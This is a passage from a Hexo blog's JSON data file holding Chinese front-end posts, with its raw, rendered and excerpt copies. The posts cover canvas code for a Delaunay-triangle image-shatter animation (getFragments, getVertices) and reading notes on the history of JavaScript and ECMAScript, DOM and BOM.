class=\"line\"></span><br><span class=\"line\">    ctx.translate(-box.x, -box.y);</span><br><span class=\"line\">    ctx.beginPath();</span><br><span class=\"line\">    ctx.moveTo(v0[0], v0[1]);</span><br><span class=\"line\">    ctx.lineTo(v1[0], v1[1]);</span><br><span class=\"line\">    ctx.lineTo(v2[0], v2[1]);</span><br><span class=\"line\">    ctx.closePath();</span><br><span class=\"line\">    ctx.clip();</span><br><span class=\"line\">    ctx.drawImage(image, 0, 0);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    var fragment = &#123;</span><br><span class=\"line\">      canvas: canvas,</span><br><span class=\"line\">      box: box</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    fragments.push(fragment);</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  return fragments;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"参数说明\"><a href=\"#参数说明\" class=\"headerlink\" title=\"参数说明\"></a>参数说明</h2><p>vertices：端点集；<br>image：图片对象，canvas的方法<code>drawImage</code>使用；</p>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1><p>这部分主要是canvas的使用，因为属于独立知识，因此不熟悉的请先学习下canvas的api。</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>接着上一篇<a href=\"/2018/08/06/delaunay-2/\">三角碎片动效（二）——get vertices</a>，这篇讲下两个核心之一生成碎片集（getFragments）。<a href=\"https://github.com/jovysun/WOW/tree/master/delaunay\" target=\"_blank\" rel=\"noopener\">源码</a></p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>有了端点集vertices就可以调用delaunay.js的方法生成三角点集triangles，正如第一篇里讲到的，这个值是一个需要绘制三角的端点索引集，每三个值对应vertices中的三个端点，然后就是运用canvas知识生成图片碎片集fragments。</p>\n<h2 id=\"效果展示\"><a href=\"#效果展示\" class=\"headerlink\" title=\"效果展示\"></a>效果展示</h2><p><img src=\"/2018-2018-08-06-delaunay-3/1.jpg\" alt=\"效果展示\"></p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"实现代码\"><a href=\"#实现代码\" class=\"headerlink\" title=\"实现代码\"></a>实现代码</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function getFragments(vertices, image) &#123;</span><br><span class=\"line\">  var triangles = Delaunay.triangulate(vertices);</span><br><span class=\"line\"></span><br><span class=\"line\">  var fragments = [];</span><br><span class=\"line\"></span><br><span class=\"line\">  for (var i = 0; i &lt; triangles.length; i += 3) &#123;</span><br><span class=\"line\">    var v0 = vertices[triangles[i + 0]];</span><br><span class=\"line\">    var v1 = vertices[triangles[i + 1]];</span><br><span class=\"line\">    var v2 = vertices[triangles[i + 2]];</span><br><span class=\"line\"></span><br><span class=\"line\">    var xMin = Math.min(v0[0], v1[0], v2[0]),</span><br><span class=\"line\">      xMax = Math.max(v0[0], v1[0], v2[0]),</span><br><span class=\"line\">      yMin = Math.min(v0[1], v1[1], v2[1]),</span><br><span class=\"line\">      yMax = Math.max(v0[1], v1[1], v2[1]);</span><br><span class=\"line\"></span><br><span class=\"line\">    var box = &#123;</span><br><span class=\"line\">      x: Math.round(xMin),</span><br><span class=\"line\">      y: Math.round(yMin),</span><br><span class=\"line\">      w: Math.round(xMax - xMin),</span><br><span class=\"line\">      h: Math.round(yMax - yMin)</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    var canvas = document.createElement(&apos;canvas&apos;);</span><br><span class=\"line\">    canvas.width = box.w;</span><br><span class=\"line\">    canvas.height = box.h;</span><br><span class=\"line\">    canvas.style.width = box.w + &apos;px&apos;;</span><br><span class=\"line\">    canvas.style.height = box.h + &apos;px&apos;;</span><br><span class=\"line\">    canvas.style.left = box.x + &apos;px&apos;;</span><br><span class=\"line\">    canvas.style.top = box.y + &apos;px&apos;;</span><br><span class=\"line\">    var ctx = canvas.getContext(&apos;2d&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">    ctx.translate(-box.x, -box.y);</span><br><span class=\"line\">    ctx.beginPath();</span><br><span class=\"line\">    ctx.moveTo(v0[0], v0[1]);</span><br><span class=\"line\">    ctx.lineTo(v1[0], v1[1]);</span><br><span class=\"line\">    ctx.lineTo(v2[0], v2[1]);</span><br><span class=\"line\">    ctx.closePath();</span><br><span class=\"line\">    ctx.clip();</span><br><span class=\"line\">    ctx.drawImage(image, 0, 0);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    var fragment = &#123;</span><br><span class=\"line\">      canvas: canvas,</span><br><span class=\"line\">      box: box</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    fragments.push(fragment);</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  return fragments;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"参数说明\"><a href=\"#参数说明\" class=\"headerlink\" title=\"参数说明\"></a>参数说明</h2><p>vertices：端点集；<br>image：图片对象，canvas的方法<code>drawImage</code>使用；</p>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1><p>这部分主要是canvas的使用，因为属于独立知识，因此不熟悉的请先学习下canvas的api。</p>"},{"title":"三角碎片动效（二）——get vertices","date":"2018-08-06T08:12:55.000Z","_content":"# 前言\n接着上一篇[三角碎片动效（一）——认识delaunay.js](/2018/08/01/delaunay-1/)，这篇讲下两个核心之一生成端点集（getVertices）。[源码](https://github.com/jovysun/WOW/tree/master/delaunay)\n\n# 概述\n生成端点集的算法有很多种，我这里是参考网上整理的一种。这个功能块很重要，下一步的三角剖分就是根据这个值来的，这个端点集直接影响的就是整张图的分割效果（数量，大小，边界等）。\n## 效果展示\n![效果展示](1.jpg)\n\n<!-- more -->\n# 详述\n## 实现代码\n```\nfunction getVertices(imgWidth, imgHeight, xSubNum, ySubNum, offsetRatio) {\n  var xSub = imgWidth / xSubNum,\n    ySub = imgHeight / ySubNum;\n  var vertices = [];\n  for (var i = 0; i <= xSubNum; i++) {\n    for (var j = 0; j <= ySubNum; j++) {\n      var x = 0;\n      if (i == 0) {\n        x = 0\n      } else if (i == xSubNum) {\n        x = imgWidth;\n      } else {\n        x = i * xSub + randomRange(-xSub * offsetRatio, xSub * offsetRatio);\n      }\n\n      var y = 0;\n      if (j == 0) {\n        y = 0\n      } else if (j == ySubNum) {\n        y = imgHeight;\n      } else {\n        y = j * ySub + randomRange(-ySub * offsetRatio, ySub * offsetRatio);\n      }\n\n      vertices.push([x, y]);\n    }\n  }\n  return vertices;\n}\n```\n## 参数说明\nimgWidth,imgHeight：图片的原始宽高；\nxSubNum,ySubNum：横向与纵向分割碎片的数量；\noffsetRatio：每个碎片随机增减幅度比例；\n\n# 备注\n这个代码很糙，后期优化，提供配置生成各种端点，例如规则的，不规则的，给定数量，大小渐进，从内向外，从任意一遍到另一边等。","source":"_posts/2018/2018-08-06-delaunay-2.md","raw":"---\ntitle: 三角碎片动效（二）——get vertices\ntags:\n  - 动效\n  - JavaScript\ncategories:\n  - 前端\ndate: 2018-08-06 16:12:55\n---\n# 前言\n接着上一篇[三角碎片动效（一）——认识delaunay.js](/2018/08/01/delaunay-1/)，这篇讲下两个核心之一生成端点集（getVertices）。[源码](https://github.com/jovysun/WOW/tree/master/delaunay)\n\n# 概述\n生成端点集的算法有很多种，我这里是参考网上整理的一种。这个功能块很重要，下一步的三角剖分就是根据这个值来的，这个端点集直接影响的就是整张图的分割效果（数量，大小，边界等）。\n## 效果展示\n![效果展示](1.jpg)\n\n<!-- more -->\n# 详述\n## 实现代码\n```\nfunction getVertices(imgWidth, imgHeight, xSubNum, ySubNum, offsetRatio) {\n  var xSub = imgWidth / xSubNum,\n    ySub = imgHeight / ySubNum;\n  var vertices = [];\n  for (var i = 0; i <= xSubNum; i++) {\n    for (var j = 0; j <= ySubNum; j++) {\n      var x = 0;\n      if (i == 0) {\n        x = 0\n      } else if (i == xSubNum) {\n        x = imgWidth;\n      } else {\n        x = i * xSub + randomRange(-xSub * offsetRatio, xSub * offsetRatio);\n      }\n\n      var y = 0;\n      if (j == 0) {\n        y = 0\n      } else if (j == ySubNum) {\n        y = imgHeight;\n      } else {\n        y = j * ySub + randomRange(-ySub * offsetRatio, ySub * offsetRatio);\n      }\n\n      vertices.push([x, y]);\n    }\n  }\n  return vertices;\n}\n```\n## 参数说明\nimgWidth,imgHeight：图片的原始宽高；\nxSubNum,ySubNum：横向与纵向分割碎片的数量；\noffsetRatio：每个碎片随机增减幅度比例；\n\n# 备注\n这个代码很糙，后期优化，提供配置生成各种端点，例如规则的，不规则的，给定数量，大小渐进，从内向外，从任意一遍到另一边等。","slug":"2018-2018-08-06-delaunay-2","published":1,"updated":"2019-05-28T07:14:01.447Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8py000ywovv92efxd97","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>接着上一篇<a href=\"/2018/08/01/delaunay-1/\">三角碎片动效（一）——认识delaunay.js</a>，这篇讲下两个核心之一生成端点集（getVertices）。<a href=\"https://github.com/jovysun/WOW/tree/master/delaunay\" target=\"_blank\" rel=\"noopener\">源码</a></p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>生成端点集的算法有很多种，我这里是参考网上整理的一种。这个功能块很重要，下一步的三角剖分就是根据这个值来的，这个端点集直接影响的就是整张图的分割效果（数量，大小，边界等）。</p>\n<h2 id=\"效果展示\"><a href=\"#效果展示\" class=\"headerlink\" title=\"效果展示\"></a>效果展示</h2><p><img src=\"/2018-2018-08-06-delaunay-2/1.jpg\" alt=\"效果展示\"></p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"实现代码\"><a href=\"#实现代码\" class=\"headerlink\" title=\"实现代码\"></a>实现代码</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function getVertices(imgWidth, imgHeight, xSubNum, ySubNum, offsetRatio) &#123;</span><br><span class=\"line\">  var xSub = imgWidth / xSubNum,</span><br><span class=\"line\">    ySub = imgHeight / ySubNum;</span><br><span class=\"line\">  var vertices = [];</span><br><span class=\"line\">  for (var i = 0; i &lt;= xSubNum; i++) &#123;</span><br><span class=\"line\">    for (var j = 0; j &lt;= ySubNum; j++) &#123;</span><br><span class=\"line\">      var x = 0;</span><br><span class=\"line\">      if (i == 0) &#123;</span><br><span class=\"line\">        x = 0</span><br><span class=\"line\">      &#125; else if (i == xSubNum) &#123;</span><br><span class=\"line\">        x = imgWidth;</span><br><span class=\"line\">      &#125; else &#123;</span><br><span class=\"line\">        x = i * xSub + randomRange(-xSub * offsetRatio, xSub * offsetRatio);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      var y = 0;</span><br><span class=\"line\">      if (j == 0) &#123;</span><br><span class=\"line\">        y = 0</span><br><span class=\"line\">      &#125; else if (j == ySubNum) &#123;</span><br><span class=\"line\">        y = imgHeight;</span><br><span class=\"line\">      &#125; else &#123;</span><br><span class=\"line\">        y = j * ySub + randomRange(-ySub * offsetRatio, ySub * offsetRatio);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      vertices.push([x, y]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  return vertices;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"参数说明\"><a href=\"#参数说明\" class=\"headerlink\" title=\"参数说明\"></a>参数说明</h2><p>imgWidth,imgHeight：图片的原始宽高；<br>xSubNum,ySubNum：横向与纵向分割碎片的数量；<br>offsetRatio：每个碎片随机增减幅度比例；</p>\n<h1 id=\"备注\"><a href=\"#备注\" class=\"headerlink\" title=\"备注\"></a>备注</h1><p>这个代码很糙，后期优化，提供配置生成各种端点，例如规则的，不规则的，给定数量，大小渐进，从内向外，从任意一遍到另一边等。</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>接着上一篇<a href=\"/2018/08/01/delaunay-1/\">三角碎片动效（一）——认识delaunay.js</a>，这篇讲下两个核心之一生成端点集（getVertices）。<a href=\"https://github.com/jovysun/WOW/tree/master/delaunay\" target=\"_blank\" rel=\"noopener\">源码</a></p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>生成端点集的算法有很多种，我这里是参考网上整理的一种。这个功能块很重要，下一步的三角剖分就是根据这个值来的，这个端点集直接影响的就是整张图的分割效果（数量，大小，边界等）。</p>\n<h2 id=\"效果展示\"><a href=\"#效果展示\" class=\"headerlink\" title=\"效果展示\"></a>效果展示</h2><p><img src=\"/2018-2018-08-06-delaunay-2/1.jpg\" alt=\"效果展示\"></p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"实现代码\"><a href=\"#实现代码\" class=\"headerlink\" title=\"实现代码\"></a>实现代码</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function getVertices(imgWidth, imgHeight, xSubNum, ySubNum, offsetRatio) &#123;</span><br><span class=\"line\">  var xSub = imgWidth / xSubNum,</span><br><span class=\"line\">    ySub = imgHeight / ySubNum;</span><br><span class=\"line\">  var vertices = [];</span><br><span class=\"line\">  for (var i = 0; i &lt;= xSubNum; i++) &#123;</span><br><span class=\"line\">    for (var j = 0; j &lt;= ySubNum; j++) &#123;</span><br><span class=\"line\">      var x = 0;</span><br><span class=\"line\">      if (i == 0) &#123;</span><br><span class=\"line\">        x = 0</span><br><span class=\"line\">      &#125; else if (i == xSubNum) &#123;</span><br><span class=\"line\">        x = imgWidth;</span><br><span class=\"line\">      &#125; else &#123;</span><br><span class=\"line\">        x = i * xSub + randomRange(-xSub * offsetRatio, xSub * offsetRatio);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      var y = 0;</span><br><span class=\"line\">      if (j == 0) &#123;</span><br><span class=\"line\">        y = 0</span><br><span class=\"line\">      &#125; else if (j == ySubNum) &#123;</span><br><span class=\"line\">        y = imgHeight;</span><br><span class=\"line\">      &#125; else &#123;</span><br><span class=\"line\">        y = j * ySub + randomRange(-ySub * offsetRatio, ySub * offsetRatio);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      vertices.push([x, y]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  return vertices;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"参数说明\"><a href=\"#参数说明\" class=\"headerlink\" title=\"参数说明\"></a>参数说明</h2><p>imgWidth,imgHeight：图片的原始宽高；<br>xSubNum,ySubNum：横向与纵向分割碎片的数量；<br>offsetRatio：每个碎片随机增减幅度比例；</p>\n<h1 id=\"备注\"><a href=\"#备注\" class=\"headerlink\" title=\"备注\"></a>备注</h1><p>这个代码很糙，后期优化，提供配置生成各种端点，例如规则的，不规则的，给定数量，大小渐进，从内向外，从任意一遍到另一边等。</p>"},{"title":"JavaScript简介（《JavaScript高级程序设计》）","date":"2018-12-18T02:00:01.000Z","updated":"2018-12-18T02:00:01.000Z","_content":"# 前言\n《JavaScript高级程序设计》，之前读过第2版，这次重读第3版，发现还是收获颇多，一方面是随着HTML5及CSS3的发布，更新了很多新知识点；另一方面经过几年工作之后再回头看，原来万变不离其宗，技术栈在不断更新，但是底层接口还是一样，编程思想也是一样。最后，通过这次温故知新，使知识体系更加的完整。\n# 概述\n第1章，了解JavaScript简史，实现和版本。\n<!-- more -->\n\n# 详述\n\n## JavaScript简史\n一种专为与网页交互而设计的脚本语言，最早来自于网景公司，目的是为了减少服务器端请求，直接在页面端验证。名字最初叫LiveScript，后来为了搭上Java热炒的顺风车，改名叫JavaScript，只是为了推广，两种语言没有直接关系。\n## JavaScript实现\n![JavaScript包括：ECMAScript、DOM、BOM](1-1.jpg)\n完整的JavaScript实现由三部分组成：\nECMAScript，由ECMA-262定义，提供核心语言功能；\n文档对象模型（DOM），提供访问和操作网页内容的方法和接口；\n浏览器对象模型（BOM），提供与浏览器交互的方法和接口。\n\nECMAScript定义语言基础，不同宿主环境有不同的实现，常见的有web浏览器，Node，Adobe Flash，个人理解有点类似java语言中的接口与具体实现类的关系。\n\nDOM是针对XML但经过扩展用于HTML的应用程序编程接口，把文档映射成结构树，不同组成部分对应不同类型节点和数据，通过DOM的API，就可以对文档进行增删改查。DOM是W3C为了解决浏览器互不兼容的问题，而制定的行业标准。DOM分不同级别，各浏览器不同版本实现的程度也不同。\n![结构树](1-2.jpg)\n\nBOM是处理浏览器相关的接口，主要包括如下：\n+ 弹出新浏览器窗口的功能；\n+ 移动、缩放和关闭浏览器窗口的功能；\n+ 提供浏览器详细信息的navigator 对象；\n+ 提供浏览器所加载页面的详细信息的location 对象；\n+ 提供用户显示器分辨率详细信息的screen 对象；\n+ 对cookies 的支持；\n+ 像XMLHttpRequest 和IE 的ActiveXObject 这样的自定义对象。\n\n## JavaScript版本\n现在只有Mozilla公司还在沿用，已没有关注的意义。目前提及浏览器对JavaScript的支持情况，一般都以ECMAScript兼容性和对DOM的支持情况为准。\n\n# 后记\nJS中的DOM包括DOM核心和DOM HTML，其他处理XML的语言实现自己的接口，例如SVG（Scalable Vector Graphic，可伸缩矢量图）1.0。BOM一直没有统一标准，HTML5有望统一。","source":"_posts/2018/2018-12-18-JS高设3版-1.md","raw":"---\ntitle: JavaScript简介（《JavaScript高级程序设计》）\ntags:\n  - JavaScript\n  - 笔记\ncategories:\n  - 前端\ndate: 2018-12-18 10:00:01\nupdated: 2018-12-18 10:00:01\n---\n# 前言\n《JavaScript高级程序设计》，之前读过第2版，这次重读第3版，发现还是收获颇多，一方面是随着HTML5及CSS3的发布，更新了很多新知识点；另一方面经过几年工作之后再回头看，原来万变不离其宗，技术栈在不断更新，但是底层接口还是一样，编程思想也是一样。最后，通过这次温故知新，使知识体系更加的完整。\n# 概述\n第1章，了解JavaScript简史，实现和版本。\n<!-- more -->\n\n# 详述\n\n## JavaScript简史\n一种专为与网页交互而设计的脚本语言，最早来自于网景公司，目的是为了减少服务器端请求，直接在页面端验证。名字最初叫LiveScript，后来为了搭上Java热炒的顺风车，改名叫JavaScript，只是为了推广，两种语言没有直接关系。\n## JavaScript实现\n![JavaScript包括：ECMAScript、DOM、BOM](1-1.jpg)\n完整的JavaScript实现由三部分组成：\nECMAScript，由ECMA-262定义，提供核心语言功能；\n文档对象模型（DOM），提供访问和操作网页内容的方法和接口；\n浏览器对象模型（BOM），提供与浏览器交互的方法和接口。\n\nECMAScript定义语言基础，不同宿主环境有不同的实现，常见的有web浏览器，Node，Adobe Flash，个人理解有点类似java语言中的接口与具体实现类的关系。\n\nDOM是针对XML但经过扩展用于HTML的应用程序编程接口，把文档映射成结构树，不同组成部分对应不同类型节点和数据，通过DOM的API，就可以对文档进行增删改查。DOM是W3C为了解决浏览器互不兼容的问题，而制定的行业标准。DOM分不同级别，各浏览器不同版本实现的程度也不同。\n![结构树](1-2.jpg)\n\nBOM是处理浏览器相关的接口，主要包括如下：\n+ 弹出新浏览器窗口的功能；\n+ 移动、缩放和关闭浏览器窗口的功能；\n+ 提供浏览器详细信息的navigator 对象；\n+ 提供浏览器所加载页面的详细信息的location 对象；\n+ 提供用户显示器分辨率详细信息的screen 对象；\n+ 对cookies 的支持；\n+ 像XMLHttpRequest 和IE 的ActiveXObject 这样的自定义对象。\n\n## JavaScript版本\n现在只有Mozilla公司还在沿用，已没有关注的意义。目前提及浏览器对JavaScript的支持情况，一般都以ECMAScript兼容性和对DOM的支持情况为准。\n\n# 后记\nJS中的DOM包括DOM核心和DOM HTML，其他处理XML的语言实现自己的接口，例如SVG（Scalable Vector Graphic，可伸缩矢量图）1.0。BOM一直没有统一标准，HTML5有望统一。","slug":"2018-2018-12-18-JS高设3版-1","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8q10011wovv477yrct4","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>《JavaScript高级程序设计》，之前读过第2版，这次重读第3版，发现还是收获颇多，一方面是随着HTML5及CSS3的发布，更新了很多新知识点；另一方面经过几年工作之后再回头看，原来万变不离其宗，技术栈在不断更新，但是底层接口还是一样，编程思想也是一样。最后，通过这次温故知新，使知识体系更加的完整。</p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>第1章，了解JavaScript简史，实现和版本。<br><a id=\"more\"></a></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"JavaScript简史\"><a href=\"#JavaScript简史\" class=\"headerlink\" title=\"JavaScript简史\"></a>JavaScript简史</h2><p>一种专为与网页交互而设计的脚本语言，最早来自于网景公司，目的是为了减少服务器端请求，直接在页面端验证。名字最初叫LiveScript，后来为了搭上Java热炒的顺风车，改名叫JavaScript，只是为了推广，两种语言没有直接关系。</p>\n<h2 id=\"JavaScript实现\"><a href=\"#JavaScript实现\" class=\"headerlink\" title=\"JavaScript实现\"></a>JavaScript实现</h2><p><img src=\"/2018-2018-12-18-JS高设3版-1/1-1.jpg\" alt=\"JavaScript包括：ECMAScript、DOM、BOM\"><br>完整的JavaScript实现由三部分组成：<br>ECMAScript，由ECMA-262定义，提供核心语言功能；<br>文档对象模型（DOM），提供访问和操作网页内容的方法和接口；<br>浏览器对象模型（BOM），提供与浏览器交互的方法和接口。</p>\n<p>ECMAScript定义语言基础，不同宿主环境有不同的实现，常见的有web浏览器，Node，Adobe Flash，个人理解有点类似java语言中的接口与具体实现类的关系。</p>\n<p>DOM是针对XML但经过扩展用于HTML的应用程序编程接口，把文档映射成结构树，不同组成部分对应不同类型节点和数据，通过DOM的API，就可以对文档进行增删改查。DOM是W3C为了解决浏览器互不兼容的问题，而制定的行业标准。DOM分不同级别，各浏览器不同版本实现的程度也不同。<br><img src=\"/2018-2018-12-18-JS高设3版-1/1-2.jpg\" alt=\"结构树\"></p>\n<p>BOM是处理浏览器相关的接口，主要包括如下：</p>\n<ul>\n<li>弹出新浏览器窗口的功能；</li>\n<li>移动、缩放和关闭浏览器窗口的功能；</li>\n<li>提供浏览器详细信息的navigator 对象；</li>\n<li>提供浏览器所加载页面的详细信息的location 对象；</li>\n<li>提供用户显示器分辨率详细信息的screen 对象；</li>\n<li>对cookies 的支持；</li>\n<li>像XMLHttpRequest 和IE 的ActiveXObject 这样的自定义对象。</li>\n</ul>\n<h2 id=\"JavaScript版本\"><a href=\"#JavaScript版本\" class=\"headerlink\" title=\"JavaScript版本\"></a>JavaScript版本</h2><p>现在只有Mozilla公司还在沿用，已没有关注的意义。目前提及浏览器对JavaScript的支持情况，一般都以ECMAScript兼容性和对DOM的支持情况为准。</p>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1><p>JS中的DOM包括DOM核心和DOM HTML，其他处理XML的语言实现自己的接口，例如SVG（Scalable Vector Graphic，可伸缩矢量图）1.0。BOM一直没有统一标准，HTML5有望统一。</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>《JavaScript高级程序设计》，之前读过第2版，这次重读第3版，发现还是收获颇多，一方面是随着HTML5及CSS3的发布，更新了很多新知识点；另一方面经过几年工作之后再回头看，原来万变不离其宗，技术栈在不断更新，但是底层接口还是一样，编程思想也是一样。最后，通过这次温故知新，使知识体系更加的完整。</p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>第1章，了解JavaScript简史，实现和版本。<br></p>","more":"<p></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"JavaScript简史\"><a href=\"#JavaScript简史\" class=\"headerlink\" title=\"JavaScript简史\"></a>JavaScript简史</h2><p>一种专为与网页交互而设计的脚本语言，最早来自于网景公司，目的是为了减少服务器端请求，直接在页面端验证。名字最初叫LiveScript，后来为了搭上Java热炒的顺风车，改名叫JavaScript，只是为了推广，两种语言没有直接关系。</p>\n<h2 id=\"JavaScript实现\"><a href=\"#JavaScript实现\" class=\"headerlink\" title=\"JavaScript实现\"></a>JavaScript实现</h2><p><img src=\"/2018-2018-12-18-JS高设3版-1/1-1.jpg\" alt=\"JavaScript包括：ECMAScript、DOM、BOM\"><br>完整的JavaScript实现由三部分组成：<br>ECMAScript，由ECMA-262定义，提供核心语言功能；<br>文档对象模型（DOM），提供访问和操作网页内容的方法和接口；<br>浏览器对象模型（BOM），提供与浏览器交互的方法和接口。</p>\n<p>ECMAScript定义语言基础，不同宿主环境有不同的实现，常见的有web浏览器，Node，Adobe Flash，个人理解有点类似java语言中的接口与具体实现类的关系。</p>\n<p>DOM是针对XML但经过扩展用于HTML的应用程序编程接口，把文档映射成结构树，不同组成部分对应不同类型节点和数据，通过DOM的API，就可以对文档进行增删改查。DOM是W3C为了解决浏览器互不兼容的问题，而制定的行业标准。DOM分不同级别，各浏览器不同版本实现的程度也不同。<br><img src=\"/2018-2018-12-18-JS高设3版-1/1-2.jpg\" alt=\"结构树\"></p>\n<p>BOM是处理浏览器相关的接口，主要包括如下：</p>\n<ul>\n<li>弹出新浏览器窗口的功能；</li>\n<li>移动、缩放和关闭浏览器窗口的功能；</li>\n<li>提供浏览器详细信息的navigator 对象；</li>\n<li>提供浏览器所加载页面的详细信息的location 对象；</li>\n<li>提供用户显示器分辨率详细信息的screen 对象；</li>\n<li>对cookies 的支持；</li>\n<li>像XMLHttpRequest 和IE 的ActiveXObject 这样的自定义对象。</li>\n</ul>\n<h2 id=\"JavaScript版本\"><a href=\"#JavaScript版本\" class=\"headerlink\" 